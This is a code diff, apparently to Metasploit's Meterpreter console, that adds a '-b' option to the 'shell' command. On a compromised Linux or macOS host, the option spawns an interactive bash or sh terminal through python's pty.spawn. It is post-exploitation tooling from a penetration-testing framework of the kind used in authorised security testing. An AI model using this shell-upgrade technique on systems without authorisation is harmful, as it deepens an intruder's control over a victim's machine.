@@ -41,6 +41,13 @@ class Console::CommandDispatcher::Stdapi::Sys
     "-f" => [ true,  "Force a reboot, valid values [1|2]"			   ])
 
   #
+  # Options used by the 'shell' command.
+  #
+  @@shell_opts = Rex::Parser::Arguments.new(
+    "-h" => [ false, "Help menu."						   ],
+    "-b" => [ false, "NX Bash PTY via pybash, requires python"			   ])
+
+  #
   # Options used by the 'shutdown' command.
   #
   @@shutdown_opts = Rex::Parser::Arguments.new(
@@ -246,6 +253,21 @@ class Console::CommandDispatcher::Stdapi::Sys
   # Drop into a system shell as specified by %COMSPEC% or
   # as appropriate for the host.
   def cmd_shell(*args)
+    pybash = false
+
+    @@shell_opts.parse(args) { |opt, idx, val|
+      case opt
+        when "-h"
+          print(
+            "Usage: shell [options]\n\n" +
+            "Opens an interactive native shell.\n" +
+            @@shell_opts.usage)
+          return true
+        when "-b"
+          pybash = true
+      end
+    }
+
     case client.platform
     when 'windows'
       path = client.fs.file.expand_path("%COMSPEC%")
@@ -261,6 +283,9 @@ class Console::CommandDispatcher::Stdapi::Sys
       end
     when 'linux', 'osx'
       # Don't expand_path() this because it's literal anyway
+      if pybash
+        return true if pybash_shell
+      end
       path = "/bin/sh"
       cmd_execute("-f", path, "-c", "-i")
     else
@@ -268,11 +293,34 @@ class Console::CommandDispatcher::Stdapi::Sys
       # must special-case COMSPEC to return the system-specific shell.
       path = client.fs.file.expand_path("%COMSPEC%")
       # If that failed for whatever reason, guess it's unix
+      if pybash
+        return true if pybash_shell
+      end
       path = (path and not path.empty?) ? path : "/bin/sh"
       cmd_execute("-f", path, "-c", "-i")
     end
   end
 
+  #
+  # Spawn a python pty /bin/bash or /bin/sh shell 
+  #
+  def pybash_shell
+    if client.fs.file.exist?("/usr/bin/python")
+      path = "/usr/bin/python"
+      if client.fs.file.exist?("/bin/bash")
+        ags = "-c \'import pty;pty.spawn(\"/bin/bash\")\'"
+      else
+        ags = "-c \'import pty;pty.spawn(\"/bin/sh\")\'"
+      end
+      begin
+        cmd_execute("-f", path, "-a", ags, "-c", "-i")
+      rescue
+        return false
+      end
+      return true
+    end
+    return false
+  end
 
   #
   # Gets the process identifier that meterpreter is running in on the remote
